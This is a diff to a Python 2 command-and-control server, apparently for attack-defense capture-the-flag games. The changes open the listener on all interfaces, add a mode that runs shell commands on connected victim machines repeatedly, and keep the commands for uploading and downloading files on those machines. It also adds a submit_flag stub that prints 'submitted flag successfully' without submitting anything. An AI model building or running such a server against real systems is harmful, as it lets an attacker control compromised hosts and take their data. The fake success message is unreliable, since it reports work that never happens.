@@ -8,7 +8,7 @@ import threading
 import re
 import os
 
-host = '127.0.0.1'  
+host = '0.0.0.0'  
 port = 4445
 addr = (host, port)
 
@@ -111,10 +111,18 @@ class Servers(SRH):
         host_info['cmd_index'] += 1
         connected[rhost] = host_info
 
+        cmd_result = self.request.recv(4096)
+        self.submit_flag(cmd_result)
+
         # print result of command execute
-        print_buf += self.request.recv(4096) + "\n"
+        print_buf += cmd_result + "\n"
         print print_buf
 
+    def submit_flag(self, flag):
+        print '[*] tring to submit flag'
+        print flag
+        print '[*] submitted flag successfully'
+        pass
 
 class CMDServer:
 
@@ -127,11 +135,12 @@ class CMDServer:
           [index]          when index is 0, the program will apply the
                            command to all the connected machines.
           [cmd]            there is three defferent types of cmd.
-                             1."run: [shell command]" execute shell instruction
-                             2."put: [local] [remote]" send a local file to target
+                             1."run:[shell command]" execute shell command
+                             2."unstop run:[shell command]" execute shell command repeatly
+                             3."put:[local] [remote]" send a local file to target
                                machine, "local" and "remote" both stand for file
                                path, it could be absolute path and relative path
-                             3."get: [remote]" download remote file from target machine
+                             4."get: [remote]" download remote file from target machine
           clear [index]    clear all the commands for specific ip we have set
                            if no index was specified, all commands would be cleared
         exit               exit the program
